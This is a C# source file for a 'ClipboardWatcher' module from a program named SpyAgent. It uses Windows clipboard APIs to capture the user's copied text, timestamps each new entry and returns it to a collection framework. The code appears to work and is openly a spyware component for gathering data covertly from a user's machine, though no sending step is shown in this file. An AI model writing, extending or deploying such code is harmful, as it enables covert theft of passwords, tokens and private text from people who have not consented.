namespace SpyAgent.Modules;

using System.Runtime.InteropServices;
using System.Text;
using SpyAgent.Core;

internal sealed class ClipboardWatcher : ISpyModule
{
    public string ModuleName => "Clipboard";
    private string _lastContent = "";

    public Task<byte[]?> CollectAsync()
    {
        if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            return Task.FromResult<byte[]?>(null);

        var content = GetClipboardContent();
        if (string.IsNullOrEmpty(content) || content == _lastContent)
            return Task.FromResult<byte[]?>(null);

        _lastContent = content;
        var entry = $"[{DateTime.UtcNow:u}] {content}\n";
        return Task.FromResult<byte[]?>(Encoding.UTF8.GetBytes(entry));
    }

    private static string GetClipboardContent()
    {
        string result = "";
        var thread = new Thread(() =>
        {
            if (OpenClipboard(IntPtr.Zero))
            {
                var handle = GetClipboardData(13);
                if (handle != IntPtr.Zero)
                {
                    var ptr = GlobalLock(handle);
                    if (ptr != IntPtr.Zero)
                    {
                        result = Marshal.PtrToStringUni(ptr) ?? "";
                        GlobalUnlock(handle);
                    }
                }
                CloseClipboard();
            }
        });
        thread.SetApartmentState(ApartmentState.STA);
        thread.Start();
        thread.Join(2000);
        return result;
    }

    [DllImport("user32.dll")] private static extern bool OpenClipboard(IntPtr hWnd);
    [DllImport("user32.dll")] private static extern bool CloseClipboard();
    [DllImport("user32.dll")] private static extern IntPtr GetClipboardData(uint format);
    [DllImport("kernel32.dll")] private static extern IntPtr GlobalLock(IntPtr hMem);
    [DllImport("kernel32.dll")] private static extern bool GlobalUnlock(IntPtr hMem);
}
